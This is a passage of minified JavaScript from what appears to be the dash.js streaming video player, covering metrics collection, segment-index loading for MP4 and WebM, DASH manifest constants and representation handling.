E(P){return(P=F.getMetricsFor(P,!0))&&P.HttpList?P.HttpList:[]}function D(P,O){return P&&(P=P[O])&&0!==P.length?P[P.length-1]:null}function I(P){var O={};if(!P)return O;for(var R=0,Q=(P=P.trim().split("\r\n")).length;R<Q;R++){var ja=P[R],W=ja.indexOf(": ");0<W&&(O[ja.substring(0,W)]=ja.substring(W+2))}return O}z=z||{};var L,G=this.context,N=void 0,w=void 0,h=void 0,F=z.metricsModel;return L={getCurrentRepresentationSwitch:function(P){return D(F.getMetricsFor(P,!0),g.default.TRACK_SWITCH)},getCurrentBufferState:function(P){return D(F.getMetricsFor(P,!0),g.default.BUFFER_STATE)},getCurrentBufferLevel:function(P){return(P=D(F.getMetricsFor(P,!0),g.default.BUFFER_LEVEL))?t.default.round10(P.level/1e3,-3):0},getCurrentHttpRequest:J,getHttpRequests:E,getCurrentDroppedFrames:function(){return D(F.getMetricsFor(p.default.VIDEO,!0),g.default.DROPPED_FRAMES)},getCurrentSchedulingInfo:function(P){return D(F.getMetricsFor(P,!0),g.default.SCHEDULING_INFO)},getCurrentDVRInfo:function(P){return D(P?F.getMetricsFor(P,!0):F.getMetricsFor(p.default.VIDEO,!0)||F.getMetricsFor(p.default.AUDIO,!0),g.default.DVR_INFO)},getCurrentManifestUpdate:function(){return D(F.getMetricsFor(p.default.STREAM),g.default.MANIFEST_UPDATE)},getLatestFragmentRequestHeaderValueByID:function(P,O){var R={};return(P=J(P))&&(R=I(P._responseHeaders)),void 0===R[O]?null:R[O]},getLatestMPDRequestHeaderValueByID:function(P){var O,Q,ja,R={};for(ja=(O=E(p.default.STREAM)).length-1;0<=ja;ja--)if((Q=O[ja]).type===l.HTTPRequest.MPD_TYPE){R=I(Q._responseHeaders);break}return void 0===R[P]?null:R[P]},addRepresentationSwitch:function(P,O,R,Q,ja){F.addRepresentationSwitch(P,O,R,Q,ja)},addDVRInfo:function(P,O,R,Q){F.addDVRInfo(P,O,R,Q)},updateManifestUpdateInfo:function(P){var O=this.getCurrentManifestUpdate();F.updateManifestUpdateInfo(O,P)},addManifestUpdateStreamInfo:function(P){var O;P&&(O=this.getCurrentManifestUpdate(),F.addManifestUpdateStreamInfo(O,P.id,P.index,P.start,P.duration))},addManifestUpdateRepresentationInfo:function(P,O){var R;P&&(R=this.getCurrentManifestUpdate(),F.addManifestUpdateRepresentationInfo(R,P.id,P.index,P.streamIndex,O,P.presentationTimeOffset,P.startNumber,P.fragmentInfoType))},addManifestUpdate:function(P){F.addManifestUpdate(p.default.STREAM,P.type,P.requestStartDate,P.requestEndDate)},addHttpRequest:function(P,O,R,Q,ja){F.addHttpRequest(P.mediaType,null,P.type,P.url,P.quality,O,P.serviceLocation||null,P.range||null,P.requestStartDate,P.firstByteDate,P.requestEndDate,R,P.duration,Q,ja)},addSchedulingInfo:function(P,O){F.addSchedulingInfo(P.mediaType,new Date,P.type,P.startTime,P.availabilityStartTime,P.duration,P.quality,P.range,O)},addRequestsQueue:function(P,O,R){F.addRequestsQueue(P,O,R)},addBufferLevel:function(P,O,R){F.addBufferLevel(P,O,R)},addBufferState:function(P,O,R){F.addBufferState(P,O,R)},addDroppedFrames:function(P){F.addDroppedFrames(p.default.VIDEO,P)},addPlayList:function(){h&&(F.addPlayList(h),h=null)},addDVBErrors:function(P){F.addDVBErrors(P)},createPlaylistMetrics:function(P,O){(h=new x.PlayList).start=new Date,h.mstart=P,h.starttype=O},createPlaylistTraceMetrics:function(P,O,R){!0===N&&(N=!1,(w=new x.PlayListTrace).representationid=P,w.start=new Date,w.mstart=O,w.playbackspeed=null!==R?R.toString():null)},updatePlayListTraceMetrics:function(P){if(w)for(var O in w)w[O]=P[O]},pushPlayListTraceMetrics:function(P,O){var R,Q;!1===N&&h&&w&&w.start&&(R=w.start,Q=P.getTime()-R.getTime(),w.duration=Q,w.stopreason=O,h.trace.push(w),N=!0)},clearAllCurrentMetrics:function(){F.clearAllCurrentMetrics()}},F=F||(0,r.default)(G).getInstance({settings:z.settings}),N=!0,h=w=null,L}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=u(241),f=v(u(47)),g=v(u(109)),t=v(u(78)),r=v(u(152)),x=u(243);m.__dashjs_factory_name="DashMetrics",M.default=f.default.getSingletonFactory(m),da.exports=M.default},{108:108,109:109,152:152,241:241,243:243,47:47,78:78}],59:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){function r(){if(!aa||!aa.hasOwnProperty("resolve"))throw Error("setConfig function has to be called previously")}function x(ma){if(ma.url){var H=new g.default;return H.setInfo(ma),H}}function z(ma,H,B){ma?O.trigger(P.SEGMENTS_LOADED,{segments:ma,representation:H,mediaType:B}):O.trigger(P.SEGMENTS_LOADED,{segments:null,representation:H,mediaType:B,error:new l.default(R.SEGMENT_BASE_LOADER_ERROR_CODE,R.SEGMENT_BASE_LOADER_ERROR_MESSAGE)})}var J=this.context,E=void 0,D=void 0,I=void 0,L=void 0,G=void 0,N=void 0,w=void 0,h=void 0,F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0,aa=void 0;return E={setConfig:function(ma){ma.baseURLController&&(aa=ma.baseURLController),ma.dashMetrics&&(N=ma.dashMetrics),ma.mediaPlayerModel&&(h=ma.mediaPlayerModel),ma.errHandler&&(I=ma.errHandler),ma.settings&&(w=ma.settings),ma.boxParser&&(L=ma.boxParser),ma.events&&(P=ma.events),ma.eventBus&&(O=ma.eventBus),ma.debug&&(D=ma.debug.getLogger(E)),ma.requestModifier&&(G=ma.requestModifier),ma.errors&&(R=ma.errors),ma.urlUtils&&(W=ma.urlUtils),ma.constants&&(Q=ma.constants),ma.dashConstants&&(ja=ma.dashConstants)},initialize:function(){F=(0,t.default)(J).create({errHandler:I,dashMetrics:N,mediaPlayerModel:h,requestModifier:G,useFetch:w?w.get().streaming.lowLatencyEnabled:null,boxParser:L,errors:R,urlUtils:W,constants:Q,dashConstants:ja})},loadInitialization:function A(H,B){r();var Y=null,Z=H?aa.resolve(H.path):null,na=B||{init:!0,url:Z?Z.url:void 0,range:{start:0,end:1500},searching:!1,bytesLoaded:0,bytesToLoad:1500,mediaType:H&&H.adaptation?H.adaptation.type:null};D.debug("Start searching for initialization."),B=x(na),F.load({request:B,success:function(T){na.bytesLoaded=na.range.end,(Y=L.findInitRange(T))?(H.range=Y,O.trigger(P.INITIALIZATION_LOADED,{representation:H})):(na.range.end=na.bytesLoaded+na.bytesToLoad,A(H,na))},error:function(){O.trigger(P.INITIALIZATION_LOADED,{representation:H})}}),D.debug("Perform init search: "+na.url)},loadSegments:function T(B,A,Y,Z,na){var pa;r(),!Y||void 0!==Y.start&&void 0!==Y.end||(Y=(pa=Y?Y.toString().split("-"):null)?{start:parseFloat(pa[0]),end:parseFloat(pa[1])}:null),Z=Z||z;var ia=null,S=null;pa=!!Y;var V=B?aa.resolve(B.path):null,oa={init:!1,url:V?V.url:void 0,range:pa?Y:{start:0,end:1500},searching:!pa,bytesLoaded:na?na.bytesLoaded:0,bytesToLoad:1500,mediaType:B&&B.adaptation?B.adaptation.type:null};Y=x(oa),F.load({request:Y,success:function(ba){var ha=oa.bytesToLoad,ka=ba.byteLength;if(oa.bytesLoaded=oa.range.end-oa.range.start,ia=L.parse(ba),(S=ia.getBox("sidx"))&&S.isComplete){var la=S.references;ba=ha=void 0,null!=la&&0<la.length&&(ha=1===la[0].reference_type),ha?function(){D.debug("Initiate multiple SIDX load."),oa.range.end=oa.range.start+S.size;var C=void 0,fa=void 0,qa=void 0,va=void 0,xa=[],za=0,Ca=(S.offset||oa.range.start)+S.size,Ba=function(Ga){Ga?(xa=xa.concat(Ga),fa<=++za&&(xa.sort((function(Ra,La){return 0>Ra.startTime-La.startTime?-1:0})),Z(xa,B,A))):Z(null,B,A)};for(C=0,fa=la.length;C<fa;C++)va=(qa=Ca)+la[C].referenced_size-1,Ca+=la[C].referenced_size,T(B,null,{start:qa,end:va},Ba,oa)}():(D.debug("Parsing segments from SIDX. representation "+B.adaptation.type+" - id: "+B.id+" for range : "+oa.range.start+" - "+oa.range.end),ba=function(C,fa){var qa=C.references,va=qa.length,xa=C.timescale,za=C.earliest_presentation_time;C=fa.range.start+C.offset+C.first_offset+C.size,fa=[];for(var Ca,Ba,Ga,Ra,La=0;La<va;La++)Ga=qa[La].subsegment_duration,Ra=qa[La].referenced_size,(Ca=new p.default).duration=Ga,Ca.startTime=za,Ca.timescale=xa,Ba=C+Ra-1,Ca.mediaRange=C+"-"+Ba,fa.push(Ca),za+=Ga,C+=Ra;return fa}(S,oa),Z(ba,B,A))}else{if(S)oa.range.start=S.offset||oa.range.start,oa.range.end=oa.range.start+(S.size||ha);else{if(ka<oa.bytesLoaded)return void Z(null,B,A);(ba=ia.getLastBox())&&ba.size?(oa.range.start=ba.offset+ba.size,oa.range.end=oa.range.start+ha):oa.range.end+=ha}T(B,A,oa.range,Z,oa)}},error:function(){Z(null,B,A)}}),D.debug("Perform SIDX load: "+oa.url+" with range : "+oa.range.start+" - "+oa.range.end)},reset:function(){F.abort(),G=L=I=F=null}}}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(94)),l=v(u(225)),f=v(u(47)),g=v(u(227)),t=v(u(158));m.__dashjs_factory_name="SegmentBaseLoader",M.default=f.default.getSingletonFactory(m),da.exports=M.default},{158:158,225:225,227:227,47:47,94:94}],60:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(){function z(){if(!W||!W.hasOwnProperty("resolve"))throw Error("setConfig function has to be called previously")}function J(aa,ma,H){aa?R.trigger(Q.SEGMENTS_LOADED,{segments:aa,representation:ma,mediaType:H}):R.trigger(Q.SEGMENTS_LOADED,{segments:null,representation:ma,mediaType:H,error:new x.default(ja.SEGMENT_BASE_LOADER_ERROR_CODE,ja.SEGMENT_BASE_LOADER_ERROR_MESSAGE)})}function E(aa){var ma=new t.default;return ma.setInfo(aa),ma}var D=this.context,I=void 0,L=void 0,G=void 0,N=void 0,w=void 0,h=void 0,F=void 0,P=void 0,O=void 0,R=void 0,Q=void 0,ja=void 0,W=void 0;return I={setConfig:function(aa){if(!(aa.baseURLController&&aa.dashMetrics&&aa.mediaPlayerModel&&aa.errHandler))throw Error(l.default.MISSING_CONFIG_ERROR);W=aa.baseURLController,h=aa.dashMetrics,F=aa.mediaPlayerModel,N=aa.errHandler,O=aa.settings,Q=aa.events,R=aa.eventBus,ja=aa.errors,L=aa.debug.getLogger(I),w=aa.requestModifier},initialize:function(){P=(0,r.default)(D).create({errHandler:N,dashMetrics:h,mediaPlayerModel:F,requestModifier:w,useFetch:O?O.get().streaming.lowLatencyEnabled:null,errors:ja})},loadInitialization:function(aa,ma){z();var H=null,B=aa?W.resolve(aa.path):null,A=aa?aa.range.split("-"):null;ma=ma||{range:{start:A?parseFloat(A[0]):null,end:A?parseFloat(A[1]):null},request:H,url:B?B.url:void 0,init:!0,mediaType:aa&&aa.adaptation?aa.adaptation.type:null},L.info("Start loading initialization."),H=E(ma),P.load({request:H,success:function(){R.trigger(Q.INITIALIZATION_LOADED,{representation:aa})},error:function(){R.trigger(Q.INITIALIZATION_LOADED,{representation:aa})}}),L.debug("Perform init load: "+ma.url)},loadSegments:function(aa,ma,H,B){z();var A=null,Y=aa?W.resolve(aa.path):null,Z=Y?Y.url:void 0;A={bytesLoaded:0,bytesToLoad:8192,range:{start:0,end:8192},request:A,url:Z,init:!1,mediaType:aa&&aa.adaptation?aa.adaptation.type:null},B=B||J,A=E(A),L.debug("Parsing ebml header"),P.load({request:A,success:function(na){!function(T,pa,ia,S){if(T&&0!==T.byteLength){var V;T=(0,p.default)(D).create({data:T});var oa=void 0,ha=null,ka={url:pa,range:{start:(ia=ia?ia.split("-"):null)?parseFloat(ia[0]):null,end:ia?parseFloat(ia[1]):null},request:ha};L.debug("Parse EBML header: "+ka.url),T.skipOverElement(G.EBML),T.consumeTag(G.Segment);var la=T.getMatroskaCodedNum();for(la+=T.getPos(),V=T.getPos();T.moreData()&&!T.consumeTagAndSize(G.Segment.Info,!0);)if(!(T.skipOverElement(G.Segment.SeekHead,!0)||T.skipOverElement(G.Segment.Tracks,!0)||T.skipOverElement(G.Segment.Cues,!0)||T.skipOverElement(G.Void,!0)))throw Error("no valid top level element found");for(;void 0===oa;)pa=T.getMatroskaCodedNum(!0),ia=T.getMatroskaCodedNum(),pa===G.Segment.Info.Duration.tag?oa=T[G.Segment.Info.Duration.parse](ia):T.setPos(T.getPos()+ia);ha=E(ka),P.load({request:ha,success:function(C){var Ca,fa=la,qa=oa,va=[],xa=0,za=[],Ba=void 0;for((C=(0,p.default)(D).create({data:C})).consumeTagAndSize(G.Segment.Cues);C.moreData()&&C.consumeTagAndSize(G.Segment.Cues.CuePoint,!0);){for((Ca={}).CueTime=C.parseTag(G.Segment.Cues.CuePoint.CueTime),Ca.CueTracks=[];C.moreData()&&C.consumeTag(G.Segment.Cues.CuePoint.CueTrackPositions,!0);){var Ga=C.getMatroskaCodedNum(),Ra=C.getPos();if((Ba={}).Track=C.parseTag(G.Segment.Cues.CuePoint.CueTrackPositions.CueTrack),0===Ba.Track)throw Error("Cue track cannot be 0");Ba.ClusterPosition=C.parseTag(G.Segment.Cues.CuePoint.CueTrackPositions.CueClusterPosition),Ca.CueTracks.push(Ba),C.setPos(Ra+Ga)}if(0===Ca.CueTracks.length)throw Error("Mandatory cuetrack not found");za.push(Ca)}if(0===za.length)throw Error("mandatory cuepoint not found");for(Ca=za.length;xa<Ca;xa+=1)C=new g.default,Ba=xa<za.length-1?za[xa+1].CueTime-za[xa].CueTime:qa-za[xa].CueTime,C.duration=Ba,C.startTime=za[xa].CueTime,C.timescale=1e3,Ba=za[xa].CueTracks[0].ClusterPosition+V,Ga=xa<za.length-1?za[xa+1].CueTracks[0].ClusterPosition+V-1:fa-1,C.mediaRange=Ba+"-"+Ga,va.push(C);L.debug("Parsed cues: "+va.length+" cues."),S(va)},error:function(){L.error("Download Error: Cues "+ka.url),S(null)}}),L.debug("Perform cues load: "+ka.url+" bytes="+ka.range.start+"-"+ka.range.end)}else S(null)}(na,Z,H,(function(T){B(T,aa,ma)}))},error:function(){B(null,aa,ma)}})},reset:function(){w=N=null}},G={EBML:{tag:440786851,required:!0},Segment:{tag:408125543,required:!0,SeekHead:{tag:290298740,required:!0},Info:{tag:357149030,required:!0,TimecodeScale:{tag:2807729,required:!0,parse:"getMatroskaUint"},Duration:{tag:17545,required:!0,parse:"getMatroskaFloat"}},Tracks:{tag:374648427,required:!0},Cues:{tag:475249515,required:!0,CuePoint:{tag:187,required:!0,CueTime:{tag:179,required:!0,parse:"getMatroskaUint"},CueTrackPositions:{tag:183,required:!0,CueTrack:{tag:247,required:!0,parse:"getMatroskaUint"},CueClusterPosition:{tag:241,required:!0,parse:"getMatroskaUint"}}}}},Void:{tag:236,required:!0}},I}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(211)),l=v(u(108)),f=v(u(47)),g=v(u(94)),t=v(u(227)),r=v(u(158)),x=v(u(225));m.__dashjs_factory_name="WebmSegmentBaseLoader",M.default=f.default.getSingletonFactory(m),da.exports=M.default},{108:108,158:158,211:211,225:225,227:227,47:47,94:94}],61:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this.init()}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),u=new(p=m,(l=[{key:"init",value:function(){this.BASE_URL="BaseURL",this.SEGMENT_BASE="SegmentBase",this.SEGMENT_TEMPLATE="SegmentTemplate",this.SEGMENT_LIST="SegmentList",this.SEGMENT_URL="SegmentURL",this.SEGMENT_TIMELINE="SegmentTimeline",this.SEGMENT_PROFILES="segmentProfiles",this.ADAPTATION_SET="AdaptationSet",this.REPRESENTATION="Representation",this.REPRESENTATION_INDEX="RepresentationIndex",this.SUB_REPRESENTATION="SubRepresentation",this.INITIALIZATION="Initialization",this.INITIALIZATION_MINUS="initialization",this.MPD="MPD",this.PERIOD="Period",this.ASSET_IDENTIFIER="AssetIdentifier",this.EVENT_STREAM="EventStream",this.ID="id",this.PROFILES="profiles",this.SERVICE_LOCATION="serviceLocation",this.RANGE="range",this.INDEX="index",this.MEDIA="media",this.BYTE_RANGE="byteRange",this.INDEX_RANGE="indexRange",this.MEDIA_RANGE="mediaRange",this.VALUE="value",this.CONTENT_TYPE="contentType",this.MIME_TYPE="mimeType",this.BITSTREAM_SWITCHING="BitstreamSwitching",this.BITSTREAM_SWITCHING_MINUS="bitstreamSwitching",this.CODECS="codecs",this.DEPENDENCY_ID="dependencyId",this.MEDIA_STREAM_STRUCTURE_ID="mediaStreamStructureId",this.METRICS="Metrics",this.METRICS_MINUS="metrics",this.REPORTING="Reporting",this.WIDTH="width",this.HEIGHT="height",this.SAR="sar",this.FRAMERATE="frameRate",this.AUDIO_SAMPLING_RATE="audioSamplingRate",this.MAXIMUM_SAP_PERIOD="maximumSAPPeriod",this.START_WITH_SAP="startWithSAP",this.MAX_PLAYOUT_RATE="maxPlayoutRate",this.CODING_DEPENDENCY="codingDependency",this.SCAN_TYPE="scanType",this.FRAME_PACKING="FramePacking",this.AUDIO_CHANNEL_CONFIGURATION="AudioChannelConfiguration",this.CONTENT_PROTECTION="ContentProtection",this.ESSENTIAL_PROPERTY="EssentialProperty",this.SUPPLEMENTAL_PROPERTY="SupplementalProperty",this.INBAND_EVENT_STREAM="InbandEventStream",this.ACCESSIBILITY="Accessibility",this.ROLE="Role",this.RATING="Rating",this.CONTENT_COMPONENT="ContentComponent",this.SUBSET="Subset",this.LANG="lang",this.VIEWPOINT="Viewpoint",this.ROLE_ASARRAY="Role_asArray",this.ACCESSIBILITY_ASARRAY="Accessibility_asArray",this.AUDIOCHANNELCONFIGURATION_ASARRAY="AudioChannelConfiguration_asArray",this.CONTENTPROTECTION_ASARRAY="ContentProtection_asArray",this.MAIN="main",this.DYNAMIC="dynamic",this.STATIC="static",this.MEDIA_PRESENTATION_DURATION="mediaPresentationDuration",this.MINIMUM_UPDATE_PERIOD="minimumUpdatePeriod",this.CODEC_PRIVATE_DATA="codecPrivateData",this.BANDWITH="bandwidth",this.SOURCE_URL="sourceURL",this.TIMESCALE="timescale",this.DURATION="duration",this.START_NUMBER="startNumber",this.PRESENTATION_TIME_OFFSET="presentationTimeOffset",this.AVAILABILITY_START_TIME="availabilityStartTime",this.AVAILABILITY_END_TIME="availabilityEndTime",this.TIMESHIFT_BUFFER_DEPTH="timeShiftBufferDepth",this.MAX_SEGMENT_DURATION="maxSegmentDuration",this.PRESENTATION_TIME="presentationTime",this.MIN_BUFFER_TIME="minBufferTime",this.MAX_SUBSEGMENT_DURATION="maxSubsegmentDuration",this.START="start",this.AVAILABILITY_TIME_OFFSET="availabilityTimeOffset",this.AVAILABILITY_TIME_COMPLETE="availabilityTimeComplete",this.CENC_DEFAULT_KID="cenc:default_KID",this.DVB_PRIORITY="dvb:priority",this.DVB_WEIGHT="dvb:weight",this.SUGGESTED_PRESENTATION_DELAY="suggestedPresentationDelay",this.SERVICE_DESCRIPTION="ServiceDescription",this.SERVICE_DESCRIPTION_SCOPE="Scope",this.SERVICE_DESCRIPTION_LATENCY="Latency",this.SERVICE_DESCRIPTION_PLAYBACK_RATE="PlaybackRate"}}])&&v(p.prototype,l),m),M.default=u,da.exports=M.default},{}],62:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(f){function g(){if(!(P&&O&&R&&Q))throw Error(p.default.MISSING_CONFIG_ERROR)}function t(){g();var Z=new Date,na=Y,T=1e3*R.getTime();na&&O.addRepresentationSwitch(na.adaptation.type,Z,T,na.id)}function r(Z){return null==Z||Z>=A.length?null:A[Z]}function x(Z,na){var T;Z.segmentAvailabilityRange=Q.calcSegmentAvailabilityRange(Z,na),Z.segmentAvailabilityRange.end<Z.segmentAvailabilityRange.start&&!Z.useCalculatedLiveEdgeTime?E(new l.default(F.SEGMENTS_UNAVAILABLE_ERROR_CODE,F.SEGMENTS_UNAVAILABLE_ERROR_MESSAGE,{availabilityDelay:Z.segmentAvailabilityRange.start-Z.segmentAvailabilityRange.end})):na&&(T=Z.segmentAvailabilityRange.end,Q.setExpectedLiveEdge(T),O.updateManifestUpdateInfo({presentationStartTime:T}))}function z(Z,na){g();for(var T=0,pa=A.length;T<pa;T++)x(A[T],Z),na&&w.trigger(h.REPRESENTATION_UPDATE_STARTED,{sender:ma,representation:A[T]})}function J(){B=!0,w.trigger(h.DATA_UPDATE_STARTED,{sender:ma})}function E(Z){B=!1;var na={sender:ma,data:H,currentRepresentation:Y};Z&&(na.error=Z),w.trigger(h.DATA_UPDATE_COMPLETED,na)}function I(Z){if(Z.sender.getType()===ja&&Z.sender.getStreamInfo().id===W&&B)if(Z.error)E(Z.error);else{var na,T=Z.sender.getStreamInfo();Z=Z.representation;var pa=O.getCurrentManifestUpdate(),ia=!1,S=0,V=void 0;if(Z.adaptation.period.mpd.manifest.type!==aa.DYNAMIC||Z.adaptation.period.mpd.manifest.ignorePostponeTimePeriod||(S=function(oa,ba){try{var ha=R.getStreamController().getActiveStreamInfo(),ka=oa.segmentAvailabilityRange.start;ha&&ha.id&&ha.id!==ba.id&&(ka=Math.min(R.getTime(),ka));var la=oa.segmentAvailabilityRange.end-ka;return 1e3*(R.getLiveDelay()-la)}catch(C){return 0}}(Z,T)),0<S)return function D(Z){w.trigger(h.AST_IN_FUTURE,{delay:Z}),setTimeout((function(){B||(J(),A.forEach((function(na){na.segmentAvailabilityRange=null})),z(R.getIsDynamic(),!0))}),Z)}(S),void E(new l.default(F.SEGMENTS_UPDATE_FAILED_ERROR_CODE,F.SEGMENTS_UPDATE_FAILED_ERROR_MESSAGE));if(pa){for(S=0;S<pa.representationInfo.length;S++)if((V=pa.representationInfo[S]).index===Z.index&&V.mediaType===ja){ia=!0;break}ia||O.addManifestUpdateRepresentationInfo(Z,ja)}!function(){for(var oa=0,ba=A.length;oa<ba;oa++){var ha=A[oa].segmentInfoType;if(null===A[oa].segmentAvailabilityRange||!A[oa].hasInitialization()||(ha===aa.SEGMENT_BASE||ha===aa.BASE_URL)&&!A[oa].segments)return}return 1}()||(P.setPlaybackQuality(ja,T,(na=Y,A.indexOf(na))),O.updateManifestUpdateInfo({latency:Y.segmentAvailabilityRange.end-R.getTime()}),O.getCurrentRepresentationSwitch(Y.adaptation.type)||t(),E())}}function L(Z){Z.isDynamic&&z(Z.isDynamic)}function G(Z){Z.mediaType===ja&&W===Z.streamInfo.id&&(Y=r(Z.newQuality),t())}function N(Z){Z.newDuration&&Y&&Y.adaptation.period&&(Y.adaptation.period.duration=Z.newDuration)}var w=(f=f||{}).eventBus,h=f.events,F=f.errors,P=f.abrController,O=f.dashMetrics,R=f.playbackController,Q=f.timelineConverter,ja=f.type,W=f.streamId,aa=f.dashConstants,ma=void 0,H=void 0,B=void 0,A=void 0,Y=void 0;return ma={getData:function(){return H},isUpdating:function(){return B},updateData:function(Z,na,T,pa){g(),J(),A=na,Y=r(pa),H=Z,T===p.default.VIDEO||T===p.default.AUDIO||T===p.default.FRAGMENTED_TEXT?z(R.getIsDynamic(),!0):E()},updateRepresentation:x,getCurrentRepresentation:function(){return Y},getRepresentationForQuality:r,getType:function(){return ja},getStreamId:function(){return W},reset:function(){w.off(h.QUALITY_CHANGE_REQUESTED,G,ma),w.off(h.REPRESENTATION_UPDATE_COMPLETED,I,ma),w.off(h.WALLCLOCK_TIME_UPDATED,L,ma),w.off(h.MANIFEST_VALIDITY_CHANGED,N,ma),B=!(H=null),A=[]}},B=!(H=null),A=[],w.on(h.QUALITY_CHANGE_REQUESTED,G,ma),w.on(h.REPRESENTATION_UPDATE_COMPLETED,I,ma),w.on(h.WALLCLOCK_TIME_UPDATED,L,ma),w.on(h.MANIFEST_VALIDITY_CHANGED,N,ma),ma}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(225));u=v(u(47)),m.__dashjs_factory_name="RepresentationController",M.default=u.default.getClassFactory(m),da.exports=M.default},{108:108,225:225,47:47}],63:[function(u,da,M){function v(g){return g&&g.__esModule?g:{default:g}}function m(g){function t(R){return"webm"===(R?R.split("/")[1]:"").toLowerCase()}function r(R){t(R.mimeType)?O.loadInitialization(R.representation):P.loadInitialization(R.representation)}function x(R){t(R.mimeType)?O.loadSegments(R.representation,R.mediaType,R.representation?R.representation.indexRange:null,R.callback):P.loadSegments(R.representation,R.mediaType,R.representation?R.representation.indexRange:null,R.callback)}g=g||{};var z=this.context,J=g.eventBus,E=g.events,D=g.dashMetrics,I=g.mediaPlayerModel,L=g.errHandler,G=g.baseURLController,N=g.debug,w=g.boxParser,h=g.requestModifier;g=g.errors;var F=void 0,P=void 0,O=void 0;return F={initialize:function(){J.on(E.SEGMENTBASE_INIT_REQUEST_NEEDED,r,F),J.on(E.SEGMENTBASE_SEGMENTSLIST_REQUEST_NEEDED,x,F),P.initialize(),O.initialize()},reset:function(){J.off(E.SEGMENTBASE_INIT_REQUEST_NEEDED,r,F),J.off(E.SEGMENTBASE_SEGMENTSLIST_REQUEST_NEEDED,x,F)}},P=(0,l.default)(z).getInstance(),O=(0,f.default)(z).getInstance(),P.setConfig({baseURLController:G,dashMetrics:D,mediaPlayerModel:I,errHandler:L,eventBus:J,events:E,errors:g,debug:N,boxParser:w,requestModifier:h}),O.setConfig({baseURLController:G,dashMetrics:D,mediaPlayerModel:I,errHandler:L,eventBus:J,events:E,errors:g,debug:N,requestModifier:h}),F}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(59)),f=v(u(60));m.__dashjs_factory_name="SegmentBaseController",u=p.default.getSingletonFactory(m),M.default=u,da.exports=M.default},{47:47,59:59,60:60}],64:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(r){r=r||{};var x,z=this.context,J=r.events,E=r.eventBus,D=r.dashConstants,I=void 0;return x={initialize:function(L){I[D.SEGMENT_TIMELINE]=(0,l.default)(z).create(r,L),I[D.SEGMENT_TEMPLATE]=(0,f.default)(z).create(r,L),I[D.SEGMENT_LIST]=(0,g.default)(z).create(r,L),I[D.SEGMENT_BASE]=(0,t.default)(z).create(r,L)},update:function(L,G,N,w,h){w||E.trigger(J.SEGMENTBASE_INIT_REQUEST_NEEDED,{mimeType:N,representation:L}),h||E.trigger(J.SEGMENTBASE_SEGMENTSLIST_REQUEST_NEEDED,{mimeType:N,mediaType:G,representation:L})},getSegmentByIndex:function(L,G,N){var w=L?L.segments?I[D.SEGMENT_BASE]:I[L.segmentInfoType]:null;return w?w.getSegmentByIndex(L,G,N):null},getSegmentByTime:function(L,G){var N=L?L.segments?I[D.SEGMENT_BASE]:I[L.segmentInfoType]:null;return N?N.getSegmentByTime(L,G):null}},I={},x}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(83)),f=v(u(81)),g=v(u(77)),t=v(u(79));m.__dashjs_factory_name="SegmentsController",u=p.default.getClassFactory(m),M.default=u,da.exports=M.default},{47:47,77:77,79:79,81:81,83:83}],65:[function(u,da,M){function v(F){return F&&F.__esModule?F:{default:F}}function m(){function F(S,V){var ha,oa=void 0,ba=void 0,ka=void 0,la=!1,C=!1;if(!S)throw Error("adaptation is not defined");if(!V)throw Error("type is not defined");if(S.hasOwnProperty("ContentComponent_asArray")&&(ba=S.ContentComponent_asArray),ha=V!==p.default.TEXT?new RegExp(V):/(vtt|ttml)/,S.Representation_asArray&&S.Representation_asArray.length&&0<S.Representation_asArray.length){var fa=W(S.Representation_asArray[0]);if(fa&&0<fa.length&&0<=h.THUMBNAILS_SCHEME_ID_URIS.indexOf(fa[0].schemeIdUri))return V===p.default.IMAGE;if(S.Representation_asArray[0].hasOwnProperty(l.default.CODECS)&&(0===(ka=S.Representation_asArray[0].codecs).search(p.default.STPP)||0===ka.search(p.default.WVTT)))return V===p.default.FRAGMENTED_TEXT}if(ba){if(1<ba.length)return V===p.default.MUXED;ba[0]&&ba[0].contentType===V&&(C=la=!0)}if(S.hasOwnProperty(l.default.MIME_TYPE)&&(la=ha.test(S.mimeType),C=!0),!C)for(V=0,ba=S.Representation_asArray&&S.Representation_asArray.length?S.Representation_asArray.length:0;!C&&V<ba;)(oa=S.Representation_asArray[V]).hasOwnProperty(l.default.MIME_TYPE)&&(la=ha.test(oa.mimeType),C=!0),V++;return la}function P(S){return"text/vtt"===S||"application/ttml+xml"===S}function O(){return function(S,V){return S.bandwidth-V.bandwidth}}function R(S){return S&&Array.isArray(S.Representation_asArray)&&S.Representation_asArray.sort((function(S,V){return S.bandwidth-V.bandwidth})),S}function Q(S,V){return S&&S.Period_asArray&&ia(V)&&S.Period_asArray[V]?S.Period_asArray[V].AdaptationSet_asArray:[]}function ja(S){var V=!1;return S&&S.hasOwnProperty("type")&&(V=S.type===l.default.DYNAMIC),V}function W(S){return S&&S.EssentialProperty_asArray&&S.EssentialProperty_asArray.length?S.EssentialProperty_asArray.map((function(V){return{schemeIdUri:V.schemeIdUri,value:V.value}})):null}function aa(S){if(S&&S.period&&ia(S.period.index)){var V=S.period.mpd.manifest.Period_asArray[S.period.index];if(V&&V.AdaptationSet_asArray&&ia(S.index))return R(V.AdaptationSet_asArray[S.index])}}function ma(S){return!(S=S.S_asArray[S.S_asArray.length-1]).hasOwnProperty("r")||0<=S.r}function H(S,V){var ba,oa=[];if(!S)return oa;for(ba=0;ba<S.length;ba++){var ha=new E.default;if(ha.timescale=1,ha.representation=V,!S[ba].hasOwnProperty(p.default.SCHEME_ID_URI))throw Error("Invalid EventStream. SchemeIdUri has to be 